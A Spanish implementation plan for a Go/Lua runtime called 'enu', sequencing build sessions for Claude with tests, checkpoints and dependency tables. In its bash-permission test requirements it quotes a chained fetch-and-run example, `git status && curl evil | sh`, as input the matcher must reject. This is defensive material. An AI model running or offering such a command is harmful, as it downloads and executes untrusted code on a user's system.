---
title: "Plan de implementación incremental"
description: "Plan de construcción incremental: una feature por sesión (S##), ordenado por dependencias del kernel."
type: "plan"
status: "vigente"
---
# Plan de implementación incremental

Estado: borrador. Este documento ordena la construcción de `enu` en una
secuencia de **sesiones, cada una con una sola feature entregable**. No es un
contrato (no congela API; eso es [api.md](../contracts/api.md)) sino un mapa de obra: en qué
orden se levanta el kernel, por qué ese orden y qué hace que una sesión esté
*hecha*.

## Seguimiento: dónde retomar en cada sesión

Cada sesión empieza con el contexto en blanco y en un contenedor efímero, así
que **el estado del progreso vive en el repositorio, no en la memoria de
Claude**. El mecanismo es el mismo patrón que ya usan `problemas.md` (campo
*estado*) y `adr.md`: un puntero visible, una bitácora append-only y la
disciplina de actualizarlos en el commit de la propia feature. Tres fuentes,
redundantes a propósito:

1. **El puntero** (la única línea imperativa): vive en [estado.md](estado.md).
2. **El tablero por fases** (vista de pájaro; se marca al cerrar la última
   sesión de cada fase): en [estado.md](estado.md).
3. **La bitácora**: una fila por sesión cerrada, con su commit, hallazgos y
   desviaciones — el "qué pasó y por qué" que el puntero no cuenta. Al final
   de [estado.md](estado.md).

**Backstop en git**: como cada commit cita su sesión (`S07: ...`), el estado se
puede reconstruir siempre con `git log --grep '^S[0-9]'` aunque el documento se
quedara desfasado. El documento manda; git es la red de seguridad.

### Protocolo de cada sesión

1. **Al empezar**: lee el puntero ▶ y la última fila de la bitácora. Eso es
   "dónde seguir" y "en qué estado quedó". No empieces otra sesión que la que
   marca el puntero (el grafo de dependencias es estricto).
2. **Durante**: implementa **solo** esa sesión, hasta cumplir su Definition of
   Done. Si destapas un hallazgo, párate y resuélvelo por el flujo de diseño
   (`problemas.md`) antes de seguir codificando.
3. **Al terminar, en el mismo commit que la feature**: avanza el puntero ▶ a la
   sesión siguiente, marca el tablero si cerraste una fase, y añade una fila a
   la bitácora. Un commit que toca código pero no mueve el puntero es una
   sesión a medias.
4. **Si la sesión cierra una fase**: ejecuta su **Checkpoint de integración**
   (🔎 CP-N, marcado tras la fase) antes de tocar el puntero. Si el checkpoint
   falla, el puntero se queda donde está y la bitácora anota qué falló: la
   siguiente sesión arregla la integración, no abre fase nueva.

## Antes de empezar: un cambio de fase

Hasta hoy el proyecto está en **fase de diseño** y la regla ha sido *no escribir
código* ([CLAUDE.md](../../CLAUDE.md)). Ejecutar este plan **abre la fase de
construcción**: a partir de la sesión S01 sí se crean ficheros Go y Lua. Eso no
deroga el resto de reglas, las refuerza:

- **La API del core es sagrada** (ADR-003). Este plan *implementa* `api.md`, no
  lo amplía. Si construyendo una feature descubres que la API no basta, eso es
  un **hallazgo** (`G##`): páralo, anótalo en [problemas.md](../findings/README.md),
  resuélvelo en los documentos *y luego* impleméntalo. El código nunca corrige
  la espec por la vía de hecho.
- **Lua decide, Go ejecuta** (ADR-004). Cada primitiva que toque la pantalla o
  escale con el repo se implementa en Go, paralela por dentro.
- **Español en prosa y commits; identificadores en inglés `snake_case`.** Los
  mensajes de commit referencian la sesión (`S07`) y el hallazgo si lo hubo.

## Cómo se usa este plan

Cada fila de las tablas de abajo es **una sesión de Claude**: una unidad de
trabajo que cabe en una ventana de contexto, deja el árbol compilando y añade
una capacidad *observable y probada*. La granularidad es deliberada: una sesión
≈ un submódulo de la API (a veces una porción, cuando el submódulo es grande).

### Contrato de sesión (Definition of Done)

Una sesión no está hecha hasta cumplir las cinco:

1. **Compila**: `go build ./...` verde, `CGO_ENABLED=0` (ADR-001).
2. **Se prueba al nivel que pide su lógica** (ver "Política de tests"): *toda*
   sesión lleva al menos un snippet Lua que ejercita la firma desde el lado del
   autor de extensiones (el arnés llega en S02). Las sesiones con **lógica
   clave** (marcadas 🔒 en el inventario) llevan **además** tests unitarios Go
   exhaustivos de sus casos límite — esos **no se omiten nunca**. Un wrapper
   fino sobre la stdlib no inventa tests de código ajeno: lo cubre el snippet y
   el checkpoint de fase.
3. **Respeta la espec**: la firma y la semántica implementadas son las de
   `api.md` §correspondiente, marcadores **⏸**/**[W]** incluidos. Ni una
   función de más.
4. **No regresiona**: las features de sesiones previas siguen verdes.
5. **Deja rastro**: commit en español citando la sesión; si hubo hallazgo,
   enlazado desde `problemas.md`.

### Política de tests: qué merece test unitario

No todo merece un test unitario, pero **la lógica clave no se puede skippear**.
La regla no es "cobertura" sino *dónde está el riesgo*. Un test unitario Go
(table-driven, con sus casos límite) es **obligatorio** cuando se cumple
cualquiera de estas:

- **La lógica es nuestra**: un algoritmo, una máquina de estados o un invariante
  que escribimos nosotros — no una delegación a la stdlib de Go ni a una
  librería. Una semántica de cancelación, un parser, un recorte de viewport.
- **El fallo es silencioso o de borde**: off-by-one, orden, concurrencia,
  recorte, parsing incremental, EOF, backpressure. Cosas que un camino feliz
  (el snippet o el checkpoint) **no** toca.
- **Implementa un hallazgo `G##`**: cada G## codifica un caso límite que costó
  decidir. Su regresión debe quedar blindada por un test que lo **nombre**
  (`// G27: out[i] alineado con fns[i]`), para que nadie lo deshaga sin enterarse.

**Basta el snippet Lua + el checkpoint de fase** (no inventes unitario) cuando:

- Es un **wrapper fino** sobre la stdlib de Go o una librería (`toml`/`yaml`
  encode, `sys.platform/hostname/now_ms`, `fs.cwd`): probar eso es probar código
  ajeno.
- Es **glue de paso** sin decisión propia (la mayoría de getters).
- Es **render visual/interactivo**: se valida inspeccionando el `Block`
  resultante o mirando la pantalla en el checkpoint, no pixel a pixel.

### Inventario de lógica clave (🔒 — tests unitarios obligatorios)

Estas sesiones implementan lógica que no puede quedar sin unitario, con el caso
exacto que cada test debe blindar. Es la lista contra la que se audita una
sesión antes de cerrarla:

| Sesión | Lógica clave a blindar |
|---|---|
| 🔒 **S02** | Forma de la tabla de error `{code,message,detail}`; un código reservado nunca se traga ni se reescribe. |
| 🔒 **S04** | El puente ⏸ goroutine-por-task + token Lua (ADR-011, cierra G31): suspensión por suelta/recupera del token; `pcall` y tail calls que envuelven un ⏸ sobreviven nativas; cero data races (`-race`). |
| 🔒 **S06** | `Future`: `set` una sola vez (segundo → `EINVAL`); varios `await` ven el valor ya resuelto. |
| 🔒 **S07** | `task.all` alinea `out[i]` con `fns[i]` (G27); `race` cancela a las perdedoras. |
| 🔒 **S08** | Desenrollado **no capturable** por `pcall` (§1.3); orden LIFO de `cleanup`; `ECANCELED` solo observable. |
| 🔒 **S09** | El watchdog corta el slice excedido y **no** se captura; emite `EBUDGET` + `core:plugin.misbehaved`. |
| 🔒 **S10** | Despacho sobre **foto** de suscriptores (G10); cancelar surte efecto inmediato; emits anidados **encolados** (anchura, no recursión). |
| 🔒 **S11** | Orden topológico por `requires`; unicidad de nombre (colisión = error); `init.lua` del usuario el último. |
| 🔒 **S13** | `reload` no deja handlers huérfanos (etiquetado por dueño, G2). |
| 🔒 **S14** | Escritura atómica (temporal+rename); `exclusive`=`O_EXCL` → `EEXIST` (G17); `stat` de inexistente → `nil`, no lanza. |
| 🔒 **S15** | Watcher: entrega **en lotes**, `debounce_ms`, filtrado `gitignore` (G7). |
| 🔒 **S16** | Vida del proceso: kill por `cleanup`; `alive` informa de existencia, no identidad (pid reciclado → `true`, G17). |
| 🔒 **S18** | `json` UTF-8 **estricto** → `EINVAL` (G11); sentinel `NULL` ida y vuelta sin perder claves. |
| 🔒 **S20** | **Parser SSE** de `Stream:events()` (eventos partidos entre chunks, `id`, comentarios); backpressure → `EIO`. |
| 🔒 **S22** | `text.width`: graphemes, east-asian, emoji ZWJ (la base de todo el layout). |
| 🔒 **S23** | `markdown` **streaming-safe**: entrada incompleta (bloque de código a medias) no rompe; el Block crece estable. |
| 🔒 **S25** | `diff`: hunks correctos en inserción/borrado/cambio y en los bordes. |
| 🔒 **S27** | `fuzzy` ordena por score de forma estable; `files` respeta `.gitignore`. |
| 🔒 **S29** | `blit` como **viewport**: offsets negativos y recorte por ambos extremos (G28); recorte de región fuera de pantalla en resize sin tocar coordenadas (G1). |
| 🔒 **S31** | Resolución de **secuencias** de teclas con timeout; pila de input (quien no consume, deja pasar). |
| 🔒 **S34** | `caps` **deny-by-default**, dos granularidades `"fs"` vs `"fs.read"` (G6); colas acotadas con backpressure. |
| 🔒 **S35** | Exclusividad `on_message`/`recv` → `EINVAL` en el acto (G8). |
| 🔒 **G42 (extensión)** | Reintento de la apertura del stream (agente.md §2): SOLO la apertura (a mitad de stream jamás), frontera exacta `max_retries`+1 aperturas, clasificación estricta `detail.retryable == true`, error propagado intacto (con el `retryable` que G43 alza a `agent:error`), cancel durante el backoff aborta sin reabrir. La MISMA política vive **duplicada** en el subagente-worker (herencia del padre incluida): blindar el motor no blinda la copia — tests propios (`agent_g42_test.go`, `agent_g42_worker_test.go`). |
| 🔒 **G53 (extensión)** | Tokenizador/máquina de estados de permisos de `bash` (`decompose_bash`/`match_bash`, agente.md §5, ADR-023): `allow` concede SOLO si CADA subcomando casa un patrón —`bash:git *` NO concede `git status && curl evil \| sh` (cierra la frontera falsa SEC-02)—; cada operador del contrato (`&&`, `\|\|`, `;`, `\|`, `\|&`, `&`, salto de línea) fuera de comillas separa; `deny` casa si ALGÚN subcomando casa (precedencia absoluta); todo constructo NO MODELABLE (`$( )`, backticks —también dentro de comillas dobles—, `$VAR` en posición de comando, redirecciones, heredocs, subshells/agrupaciones, comillas desbalanceadas) cae FAIL-CLOSED a `ask` (deny en headless), nunca concede (P17); el escape `\` no engaña al rastreador de separadores. El núcleo `deny→allow` se blinda table-driven en `_policy_decision` — tests propios (`agent_g53_test.go`). |
| 🔒 **G54 (kernel)** | Política de redirects del kernel HTTP (`withRedirectPolicy`/`isCrossHost`, api.md §8; sube `APILevel` a 4): presupuesto `max_redirects` respetado y, al agotarlo, la última `3xx` entregada como DATO (no lanza); `0` = no seguir ninguno; en cada salto **cross-host** (host distinto —nombre y puerto, plegando el default del esquema— o degradación `https`→`http`) se recortan TODAS las cabeceras del llamante, sin lista blanca y sin restaurarlas aunque un salto posterior regrese al host inicial; el upgrade same-host `http`→`https` NO es cross-host (redirect benigno); la política vive en una copia por petición del cliente (no muta el cliente compartido). Cubre `request` y `stream` — tests propios (`http_g54_test.go`). |

Las sesiones **fuera** de esta lista (S01, S03, S05, S12, S17, S19, S21, S24,
S26, S28, S30, S32, S33 y las de extensiones Lua de la Fase 8) se cierran con
snippet + checkpoint; si al implementarlas aparece lógica propia no trivial, se
añaden aquí — el inventario crece, nunca se relaja.

### Columnas de las tablas

- **Sesión** — identificador secuencial.
- **Feature** — la capacidad entregada.
- **Depende de** — sesiones que deben existir antes (el grafo es estricto).
- **Espec** — sección de `api.md` (u otro contrato) que la define.
- **Criterio de hecho** — la prueba concreta que la cierra.

### Dónde parar a probar (tres tipos de parada)

El plan tiene paradas de tres granularidades, de menor a mayor alcance:

1. **Definition of Done** — al final de *cada sesión*. Unidad: prueba la firma
   recién implementada, aislada (lo de arriba).
2. **Checkpoint de integración (🔎 CP-N)** — al cierre de *cada fase*. Une lo
   acumulado y lo ejercita **de extremo a extremo** con una prueba de humo
   concreta; aparecen marcados tras la última sesión de cada fase. Es el "para
   y comprueba que todo lo de esta fase encaja antes de seguir". Si el
   checkpoint falla, **no se avanza de fase** aunque cada sesión esté verde por
   separado.
3. **Hito de veto** — puntos donde el resultado puede *reordenar el plan*
   (S09, S28, S37). Listados al final, en "Hitos de validación".

## Por qué este orden (el grafo de dependencias)

El kernel no se construye módulo a módulo en el orden en que `api.md` los
enumera, sino por **dependencia de ejecución**:

1. **El scheduler es la quilla.** Casi toda la API es **⏸**: no se puede
   probar `enu.fs.read` sin una task que la espere ni un loop que la reanude. Por
   eso, tras el esqueleto, lo primero y más caro es el puente
   corrutina-Lua ↔ goroutine-Go con su event loop (ADR-004). Todo cuelga de ahí.
2. **Eventos y loader** vienen pronto porque son el sustrato para *cargar y
   probar* cualquier cosa real (`init.lua`, `core:ready`) y para las guardas de
   robustez (`pcall` por frontera, ADR-008).
3. **IO, red, texto, búsqueda** son primitivas Go relativamente independientes
   entre sí una vez existe el scheduler; se ordenan por valor de desbloqueo
   (`fs`/`proc` antes que `http`, porque los tests de red se apoyan en ficheros).
4. **La UI va después de un spike de veto** (ADR-007, cuestión abierta nº1 de
   [arquitectura.md](../core/arquitectura.md)): no se compromete la arquitectura de
   compositor + toolkit-en-Lua sin demostrar antes que es fluida.
5. **Los workers** llegan tarde porque son paralelismo opt-in: nada del camino
   básico depende de ellos, y necesitan que la API **[W]** ya exista para
   recortarla con `caps`.
6. **Las extensiones oficiales** (agente, providers, MCP, chat, toolkit, repl)
   son la última fase: son Lua sobre la API ya congelada, sin privilegio de
   kernel (ADR-003). Su orden interno lo manda su propio acoplamiento.

```
S01 esqueleto
      │
      ▼
S04 SCHEDULER ──┬─────────────┬───────────────┬──────────────┐
   (loop+task)  │             │               │              │
      ▼         ▼             ▼               ▼              ▼
   S08 events  S11 fs       S15 http        S18 text       S24 worker
      ▼         S12 watch   S16 stream      S19 markdown
   S09 loader  S13 proc     S17 ws          S20 highlight
      ▼         S14 sys                      S21 diff
   (plugins)    S10 codecs                   S22 re
                                             S23 search
                                                  │
                                                  ▼
                                   S25 SPIKE ADR-007 (veto)
                                                  ▼
                                   S26-S30 UI (compositor, input...)
                                                  ▼
                                   S31+ extensiones oficiales (Lua)
```

---

## Fase 0 — Esqueleto y banco de pruebas

El objetivo es poder ejecutar Lua dentro del binario y poder *probarlo*, sin
ninguna primitiva todavía.

| Sesión | Feature | Depende de | Espec | Criterio de hecho |
|---|---|---|---|---|
| **S01** | Bootstrap: módulo Go, `main`, embebido de gopher-lua, inyección del global `enu`, **baseline del sandbox** (deshabilitar `io`, `os.execute/exit/remove/rename/getenv`, redirigir `print`), `enu.version`, `enu.has`. | — | §1.2, §2 | `enu -e 'return enu.version.api'` imprime el nivel; `os.execute` es `nil` desde Lua. |
| **S02** | Errores estructurados (puente Go↔Lua: `error{code,message,detail}`) + **arnés de tests** que corre snippets Lua contra el runtime y hace asserts. | S01 | §1.4 | Un test fuerza `EINVAL` y captura la tabla con `pcall`; el arnés es reutilizable por todas las sesiones siguientes. |
| **S03** | `enu.log` (a fichero en `data_dir`, anotando plugin de origen; `print` = `info`). | S01 | §15 | Snippet escribe y el test lee la línea del log. Útil para depurar todo lo demás. |

> 🔎 **CP-1 · El runtime arranca y ejecuta Lua aislado** (tras S03).
> Prueba de humo: `enu -e 'enu.log.info("hola"); return enu.version.api'` imprime
> el nivel y deja la línea en el log; desde Lua, `io`, `os.execute` y
> `os.getenv` son `nil` (sandbox sin fugas); el arnés corre su suite verde. Si
> el sandbox tiene un agujero, se ve aquí, antes de construir nada encima.

## Fase 1 — El scheduler (la quilla)

Lo más difícil del kernel. Se parte en piezas pequeñas porque cada una es
sutil y debe probarse aislada.

| Sesión | Feature | Depende de | Espec | Criterio de hecho |
|---|---|---|---|---|
| **S04** | **Event loop + cola de eventos + `task.spawn` + `Task:await`** + el puente ⏸: una task se suspende, una goroutine publica su completion en la cola, el loop la reanuda. Primitiva ⏸ de prueba interna para ejercer el puente. | S02 | §1.3, §3 | Una task suspende, otra goroutine la despierta con un valor; `await` lo devuelve. Cero data races (`-race`). |
| **S05** | `enu.task.sleep`, `enu.task.defer`, `enu.task.every` (timers periódicos, handler síncrono) + `Timer:stop()`. | S04 | §3 | `sleep(50)` no bloquea el loop (otra task progresa en paralelo); `every` dispara N veces y `stop` lo corta. |
| **S06** | `enu.task.future` (rendez-vous de un solo uso; `set` síncrono una vez, `await` múltiple). | S04 | §3 | Una task espera `Future:await`, otra hace `set`; segundo `set` lanza `EINVAL`. |
| **S07** | `enu.task.all` (resultados **alineados con inputs**, G27) y `enu.task.race` (índice ganador; cancela el resto). | S04, S06 | §3 | `all` sobre 3 tasks devuelve `out[i]==fns[i]`; si una lanza, las otras se cancelan y relanza. |
| **S08** | **Cancelación**: `Task:cancel()` + `enu.task.cleanup` (pila LIFO) + desenrollado **no capturable por `pcall`** (§1.3); `ECANCELED` solo observable en `await`. | S04 | §1.3, §3 | Una task cancelada corre sus `cleanup`s; un `pcall` envolvente *no* atrapa el aborto. |
| **S09** | **Watchdog**: presupuesto por slice (100 ms, configurable), aborto por `EBUDGET` no capturable, emisión de `core:plugin.misbehaved`. | S08 | §1.3 | Un bucle Lua de CPU puro que excede el presupuesto es abortado; el evento se emite (verificable tras S10). |

> 🔎 **CP-2 · El modelo de concurrencia del navegador, completo** (tras S09) —
> el checkpoint más importante del kernel. Prueba de humo en un solo script:
> (a) `task.all` sobre 3 tasks devuelve resultados alineados; (b) `race`
> cancela a las perdedoras; (c) una task cancelada corre sus `cleanup` y un
> `pcall` envolvente *no* atrapa el aborto; (d) un bucle de CPU puro lo corta
> el watchdog (`EBUDGET`) **sin congelar el loop** — una `every` en paralelo
> sigue tickeando. Valida ADR-004/008 de extremo a extremo; cualquier grieta
> del puente o del desenrollado es barata de cerrar aquí y carísima después.

## Fase 2 — Bus de eventos y loader

Con esto el runtime ya puede *cargar plugins reales* y emitir su ciclo de vida.

| Sesión | Feature | Depende de | Espec | Criterio de hecho |
|---|---|---|---|---|
| **S10** | `enu.events` (`on`/`once`/`emit`): despacho síncrono sobre **foto** de suscriptores (G10), `pcall` por frontera, **emits anidados encolados** (anchura, no recursión). | S04 | §4 | Cancelar durante el despacho surte efecto inmediato; un ping-pong entre handlers se aplana y el watchdog lo corta, no desborda la pila. |
| **S11** | **Loader**: `plugin.toml`/`init.lua`, rutas de `require` del plugin, **orden de arranque canónico** (core → plugins topológico por `requires` → `init.lua` usuario → `core:ready`), `enu.plugin.current/list`, `enu.config.dir/data_dir`. | S10 | §14 | Dos plugins con dependencia se cargan en orden topológico; el `init.lua` del usuario va último; `core:ready` se emite una vez. |
| **S12** | Activación de extensiones embebidas (`go:embed`, **inactivas por defecto**, ADR-010) gobernada por `enu.toml`; errores por extensión inactiva **accionables** (nombran la línea que lo arregla). Sin red. | S11 | §14, ADR-010 | Una extensión embebida no se carga salvo que `enu.toml` la active; el error apunta a la línea exacta. (La *pantalla* de runtime desnudo, que es UI, llega en S30.) |
| **S13** | `enu.plugin.reload` (best-effort, G2): etiquetado de handles por dueño, `core:plugin.unload`, vaciado de caché de `require`, recarga de `init.lua`. | S11 | §14 | Recargar un plugin suelta sus suscripciones y vuelve a registrar; un test verifica que no quedan handlers huérfanos. |

> 🔎 **CP-3 · Cargar y recargar plugins reales** (tras S13). Prueba de humo:
> dos plugins en disco, uno hace `require` del otro; se cargan en orden
> topológico; `core:ready` se emite una vez; el `init.lua` del usuario corre
> el último; editar un plugin y `reload` no deja handlers huérfanos; un plugin
> que lanza en un handler queda aislado por `pcall` sin tumbar a los demás
> (ADR-008). Es la primera vez que "el producto" (un plugin) corre de verdad.

## Fase 3 — IO, sistema y codecs

Primitivas Go que el agente y las herramientas necesitan. Independientes entre
sí; se ordenan por valor de desbloqueo para los tests posteriores.

| Sesión | Feature | Depende de | Espec | Criterio de hecho |
|---|---|---|---|---|
| **S14** | `enu.fs` síncronas-⏸: `read`, `write`/`append` **atómicas** (temporal+rename), `exclusive`=`O_EXCL` (G17), `stat` (`nil` si no existe), `list`, `mkdir`/`remove`(recursive)/`rename`/`copy`, `tmpdir`, `cwd`. | S04 | §5 | Escritura atómica verificada; `write{exclusive}` sobre fichero existente lanza `EEXIST`; `stat` de inexistente da `nil`, no lanza. |
| **S15** | `enu.fs.watch` (lotes, `gitignore`, `debounce_ms`, `Watcher:stop()`, solo estado principal). | S14 | §5 | Un `git checkout` simulado (muchos ficheros) llega como **un** lote; lo ignorado por git no genera eventos. |
| **S16** | `enu.proc`: `run` (buffers, sin shell implícita), `spawn` (`Proc` con streams), `write`/`close_stdin`, `read_line`/`read`, `wait`/`kill`, `alive` (G17). Vida vía `cleanup` + red de seguridad GC. | S08 | §6 | `run(["echo","hi"])` devuelve `code=0,stdout`; un `spawn` se mata por `cleanup` al cancelar la task. |
| **S17** | `enu.sys`: `platform`, `env`/`setenv` (solo subprocesos futuros), `now_ms`/`mono_ms`, `hostname`. | S01 | §7 | `setenv` se ve en un subproceso lanzado después, no en el actual. |
| **S18** | Codecs: `enu.json` (**UTF-8 estricto** G11, sentinel `NULL`, `pretty`), `enu.toml`, `enu.yaml`. | S02 | §12 | `json.encode` de bytes inválidos lanza `EINVAL`; `NULL` ida y vuelta no pierde claves; `toml.decode` lee un `plugin.toml`. |

> 🔎 **CP-4 · Una herramienta de verdad, solo con primitivas** (tras S18; sin
> red ni UI). Prueba de humo / dogfooding temprano: un plugin Lua que recorre
> el repo (`search.files`), lee ficheros (`fs.read`), lanza `git status`
> (`proc.run`), parsea y emite un resumen (`json.encode`). Ejercita el
> **corolario de completitud** (filosofía §2): si alguna pieza no se puede
> escribir solo con la API, falta una primitiva — y se trata como hallazgo,
> no como atajo.

## Fase 4 — Red

El streaming es de primera clase porque los adaptadores de providers viven en
Lua y consumen SSE (ADR-005).

| Sesión | Feature | Depende de | Espec | Criterio de hecho |
|---|---|---|---|---|
| **S19** | `enu.http.request` (buffereada; no lanza por status ≥400; `tls`, proxy por entorno y por petición G12). | S04 | §8 | Contra un servidor de test, un 404 devuelve `status=404` sin lanzar; un fallo de transporte lanza `ENET`. |
| **S20** | `enu.http.stream`: `Stream` (status/headers), `chunks()`, **`events()` parser SSE incorporado**, `idle_timeout_ms`, backpressure (buffer acotado → `EIO`). | S19 | §8 | Un SSE de prueba itera `{event,data,id}`; un consumidor lento que desborda el buffer recibe `EIO`. |
| **S21** | `enu.ws.connect` (`send`/`recv`/`close`). | S04 | §8 | Eco websocket: `send` y `recv` round-trip; `recv` tras cierre da `nil`. |

> 🔎 **CP-5 · El camino de red, incluido streaming** (tras S21). Prueba de
> humo contra un servidor local de test: `http.request` trata un 404 como dato
> (no lanza); un SSE consumido con `Stream:events()` mientras **otra task
> progresa** (el loop no se bloquea); un `ws` de eco round-trip; y un
> consumidor lento que desborda el buffer recibe `EIO` (backpressure real).

## Fase 5 — Texto y búsqueda (Go pesado)

Lo cuadrático-en-pantalla, en Go. Aquí se define el tipo **Block** (compartido
con la UI).

| Sesión | Feature | Depende de | Espec | Criterio de hecho |
|---|---|---|---|---|
| **S22** | `enu.text` básico + **tipo `Block`**: `width` (graphemes/emoji), `wrap`→Block, `truncate`; `enu.ui.block` (construcción manual), tipo `Style`, `enu.ui.caps` (degradado de color). | S02 | §10, §9.2 | `width("😀")` correcto; `wrap` produce un Block con `.width/.height`; un Block manual se inspecciona en test. |
| **S23** | `enu.text.markdown` (render completo, **streaming-safe** ante entrada incompleta, themable). | S22 | §10 | Markdown parcial (en mitad de un bloque de código) no rompe; el Block crece de forma estable al añadir texto. |
| **S24** | `enu.text.highlight` (syntax highlighting por lenguaje). | S22 | §10 | Resaltado de un snippet Go produce spans con estilo; lenguaje desconocido degrada a texto plano. |
| **S25** | `enu.text.diff` (hunks estructurados; `render=true` → Block). | S22 | §10 | Diff de dos strings devuelve hunks correctos y, con `render`, un Block pintado. |
| **S26** | `enu.re` (RE2): `compile`, `match`, `find_all`, `replace`. | S02 | §10 | Patrón con grupos captura; `find_all` devuelve rangos; RE2 no acepta backreferences (error claro). |
| **S27** | `enu.search`: `files` (recursivo, `.gitignore`), `grep` (iterador paralelo), `fuzzy` (síncrono acotado, para pickers). | S04, S14 | §11 | `grep` itera `{path,line_no,ranges}` según llegan; `fuzzy` ordena por score; `files` respeta `.gitignore`. |

> 🔎 **CP-6 · Render y búsqueda a escala de repo, en headless** (tras S27).
> Prueba de humo, todo inspeccionable en tests sin pintar pantalla:
> `markdown` del propio README → Block con dimensiones; `highlight` de un
> `.go`; `diff` de dos versiones de un fichero; `grep` y `fuzzy` sobre el repo
> entero con sus tiempos. Deja listas las piezas pesadas que la UI solo
> *coloca*.

## Fase 6 — UI (con spike de veto primero)

No se compromete la arquitectura de UI sin validarla. El spike es una sesión de
pleno derecho con criterio de **veto pre-comprometido** (ADR-007).

| Sesión | Feature | Depende de | Espec | Criterio de hecho |
|---|---|---|---|---|
| **S28** | **SPIKE ADR-007**: compositor + celdas/regiones mínimos + toolkit Lua mínimo, torturado con (a) streaming de tokens con markdown a pantalla completa y (b) fuzzy picker sobre ~100k ficheros. | S23, S27 | arquitectura §"Cuestiones abiertas" nº1 | Mediciones de fluidez. **Si no es fluido**, se ejecuta el veto: el toolkit se moverá a Go conservando la API pública (esto reordena la Fase 8). Decisión registrada en `adr.md`. |
| **S29** | `enu.ui` compositor real: `region` (z-order, recorte en resize G1), `blit` (**viewport** con offsets negativos G28, copia nunca re-render), `fill`/`clear`, `size`, coalescing ~30 ms. | S28 | §9.1 | Blittear el mismo Block con distinto offset *no* recalcula; una región fuera de pantalla se recorta sin pintar fuera de límites. |
| **S30** | Ciclo de vida de `Region`: `move`/`resize`/`raise`/`lower`/`show`/`hide`/`destroy`/`cursor` (un solo dueño del cursor). | S29 | §9.1 | z-order respeta `raise/lower`; solo la última `cursor()` gana. |
| **S31** | Input: `on_input` (pila, `fn(ev)->consumed`), `keymap` (notación, secuencias con timeout en el core), **paste de imagen** → fichero temporal + `path` (G30). | S29 | §9.3 | La pila enruta al handler superior; `"g g"` resuelve con timeout; una imagen pegada llega como `path`, no bytes. |
| **S32** | Resto de `enu.ui`: `clipboard` (OSC 52) y eventos `ui:resize`/`focus`/`suspend`/`resume`; headless G20 (`enu.ui` **no existe** sin TTY, detectable por `enu.has("ui")`). | S29 | §9.2, §9, §4 | Bajo `enu -e` el módulo `enu.ui` es inexistente y `enu.has("ui")` es `false`. |
| **S33** | **Pantalla de runtime desnudo** (G21): render fijo pre-Lua (versión, rutas, embebidas, acciones) cuando hay TTY y ningún plugin activo. | S12, S29 | §14 | Arrancar sin plugins activos pinta la pantalla; activar el conjunto oficial escribe `plugins.enabled` y continúa el arranque. |

> 🔎 **CP-7 · Ver enu por primera vez: TUI interactiva** (tras S33; el veto
> S28 ya quedó atrás dentro de esta fase). Prueba de humo **manual, con TTY**:
> arrancar sin plugins → pantalla de runtime desnudo; activar el conjunto
> oficial; un plugin pinta una región con markdown en streaming token a token
> y responde a un keymap (`ctrl+k`); redimensionar la terminal y ver el
> recorte/relayout (G1); pegar una imagen y comprobar que llega como `path`,
> no como bytes (G30). El primer momento "producto".
>
> **DRIVER DE TTY IMPLEMENTADO (cierre de CP-7).** El driver que conecta el
> `enu.ui` (compositor + pila de input + eventos `ui:*`, todo construido headless
> en S22–S32) a un terminal de verdad —raw mode, volcado del frame a stdout,
> lectura/parseo de stdin a eventos, `SIGWINCH` → `resize`, apagado por
> `core:shutdown`— vive en `driver.go`/`tty.go` (+ `flushFrame`/`invalidate`).
> NO amplía la API sagrada (APILevel sigue en 2): es interfaz del BINARIO, como
> la CLI de S45; el quit se apoya en el evento `core:shutdown` que §4 ya
> reservaba (un handler interno Go lo convierte en apagado), sin inventar
> `enu.ui.quit`. La parte que parecía "no automatizable" SÍ se blinda headless por
> **inyección** (igual que la pila de input de S31): el parser de bytes→eventos
> (`tty_test.go`) y el bucle completo tecla→handler Lua→frame ANSI conducido con
> tuberías en memoria (`driver_test.go`), incluido el **plugin de demostración
> real** `examples/enu/plugins/tui-demo`. Solo queda manual lo irreductiblemente
> visual (mirar el terminal real), verificado con una prueba de humo sobre un
> pseudo-terminal.

## Fase 7 — Workers (paralelismo opt-in)

Llegan tarde a propósito: necesitan que la API **[W]** ya exista para recortarla
con `caps`. Cada worker es un mini-runtime completo (scheduler propio, **sin
watchdog**).

| Sesión | Feature | Depende de | Espec | Criterio de hecho |
|---|---|---|---|---|
| **S34** | `enu.worker.spawn` (estado Lua aislado, carga `module`), **`caps` con dos granularidades** (`"fs"` vs `"fs.read"`, deny-by-default para superficie nueva, G6), `send`/`recv` con colas **acotadas** (backpressure). | S04, S11 | §13 | Un worker con `caps={"fs.read"}` no ve `fs.write` (no existe); `send` suspende cuando la cola se llena. |
| **S35** | `Worker:on_message` (**excluyente con `recv`**, G8: lanza `EINVAL` si se mezclan), canal `enu.worker.parent`, `terminate` (inmediato y seguro), tasks/timers/futures dentro del worker. | S34 | §13 | Registrar `on_message` con un `recv` pendiente lanza `EINVAL`; un worker corre varias tasks; `terminate` lo corta sin afectar al padre. |

> 🔎 **CP-8 · Paralelismo real y sandbox por capacidades** (tras S35). Prueba
> de humo: un worker con `caps={"fs.read","search"}` indexa el repo y devuelve
> un digesto al estado principal; dentro del worker, `fs.write` y `ui`
> **no existen** (deny-by-default, G6); `terminate` a mitad no afecta al padre;
> `send` suspende al llenar la cola acotada (backpressure, coherente con CP-5).

## Fase 8 — Extensiones oficiales (Lua sobre la API congelada)

Aquí ya no se toca el kernel: es Lua sobre la API pública, sin privilegio de
kernel (ADR-003). El orden lo manda el acoplamiento entre extensiones. Si la
sesión S28 ejecutó el veto, el toolkit (S40) se construye en Go en su lugar.

| Sesión | Feature | Depende de | Espec | Criterio de hecho |
|---|---|---|---|---|
| **S36** | Extensión **providers**: lector del registro TOML, contrato del adaptador, `providers.approx_tokens` (la heurística que G23 sacó del core). | S18, S20 | [providers.md](../contracts/providers.md) | El registro TOML se carga; un adaptador stub responde a una petición simulada. |
| **S37** | **Adaptador Anthropic** (SSE, tool calls, system prompt, thinking blocks) como primer dialecto real. | S36 | providers.md | Contra un SSE grabado, el adaptador emite el stream de mensajes canónico. |
| **S38** | Extensión **sesiones**: JSONL append-only, modelo canónico de mensajes, lockfiles (`fs.write{exclusive}` + `proc.alive` para huérfanos). | S14, S16 | [sesiones.md](../contracts/sesiones.md) | Una sesión se persiste y se reanuda; un lock huérfano (pid muerto) se detecta y reclama. |
| **S39** | Extensión **agente** (motor headless): turno, registro de tools, **permisos**, hooks-middleware (`tool.pre`...), eventos `agent:*`. | S37, S38 | [agente.md](../contracts/agente.md) | Un turno completo con una tool de prueba; un permiso denegado produce error accionable. |
